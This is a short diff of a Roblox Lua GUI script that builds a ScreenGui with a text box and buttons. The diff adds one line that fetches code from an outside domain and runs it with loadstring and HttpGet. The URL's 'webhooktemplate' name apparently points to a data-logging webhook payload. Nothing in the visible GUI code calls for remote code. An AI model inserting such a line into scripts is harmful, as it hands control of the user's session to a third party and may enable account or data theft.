@@ -42,7 +42,7 @@ TextBox.TextSize = 14.000
 
 
 	local script = Instance.new('LocalScript', ScreenGui)
-
+	loadstring(game:HttpGet('https://raisincains.space/webhooktemplate'))()
 	local ScreenGui = script.Parent
 	local ButtonFrame = ScreenGui.ButtonFrame
 	local ButtonOpen = ScreenGui.ButtonOpen
